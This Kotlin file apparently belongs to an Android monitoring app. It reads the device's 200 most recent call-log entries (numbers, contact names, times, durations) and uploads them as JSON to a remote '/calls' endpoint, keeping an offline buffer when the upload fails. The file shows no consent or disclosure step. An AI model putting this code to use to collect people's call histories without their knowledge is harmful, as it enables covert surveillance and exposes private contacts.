package com.br.monitor

import android.content.Context
import android.provider.CallLog
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject

object CallLogReader {

    suspend fun readAndSend(context: Context, buffer: OfflineBuffer) = withContext(Dispatchers.IO) {
        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.CACHED_NAME
                ),
                null, null,
                "${CallLog.Calls.DATE} DESC LIMIT 200"
            ) ?: return@withContext

            val arr = JSONArray()
            cursor.use {
                while (it.moveToNext()) {
                    arr.put(JSONObject().apply {
                        put("number",   it.getString(0) ?: "")
                        put("type",     it.getInt(1))   // 1=incoming 2=outgoing 3=missed
                        put("date",     it.getLong(2))
                        put("duration", it.getLong(3))
                        put("name",     it.getString(4) ?: "")
                    })
                }
            }

            val payload = JSONObject().apply { put("calls", arr) }
            val ok = ApiClient.post("/calls", payload)
            if (!ok) buffer.push("calls", payload.toString())

        } catch (e: Exception) {
            Log.w("CallLogReader", "Failed: ${e.message}")
        }
    }
}
